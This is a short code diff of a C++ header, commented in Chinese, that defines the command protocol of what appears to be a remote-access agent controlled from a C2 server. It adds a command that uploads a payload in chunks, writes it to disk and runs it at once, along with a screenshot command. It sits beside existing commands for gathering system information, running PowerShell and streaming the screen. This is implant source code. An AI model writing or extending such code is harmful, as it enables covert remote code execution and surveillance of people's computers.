@@ -42,9 +42,21 @@ constexpr uint16_t kCtlGetSession = 0x4003;
 // 业务指令码（系统段 0x3xxx，plugin=kPluginSys）
 constexpr uint16_t kCmdSysInfo = 0x3001;  // 收集系统信息
 constexpr uint16_t kCmdExecPs = 0x3008;   // 执行 PowerShell 命令
+constexpr uint16_t kCmdPayload = 0x3009;  // payload 分块上传并执行（协议 §10）
 
 // 业务指令码（远程控制段 0x1xxx，plugin=kPluginRemote）
+constexpr uint16_t kCmdScreenshot = 0x1001;    // 单帧截屏（响应：JPEG 原始字节）
 constexpr uint16_t kCmdScreenStream = 0x1002;  // 屏幕流控制（beacon 信道）
+
+// ---- payload 分块上传参数（协议 §10，两端契约）----
+// 指令 0x3009 的 payload（C2 已剥离 16B agent_id 前缀后交给 Agent）：
+//   name_len u16 | name (UTF-8, 仅文件名) | args_len u16 | args (UTF-8, 可空)
+//   | offset u64 | flags u8 | data_len u32 | data
+// flags bit0 = 1 表示最后一块（写盘完成后立即执行）。
+constexpr uint32_t kPayloadChunkSize = 256 * 1024;      // 单块数据上限 256 KiB
+constexpr uint32_t kPayloadMaxTotal = 64 * 1024 * 1024; // 落盘总大小上限 64 MiB
+constexpr uint16_t kPayloadMaxNameLen = 128;
+constexpr uint8_t kPayloadFlagLast = 0x01;
 
 // 屏幕流长连接段（0x5xxx，走专用 TCP 长连接 4445，不经 beacon）
 constexpr uint16_t kCmdStreamHello = 0x0501;  // 握手（明文）：agent_id+client_nonce
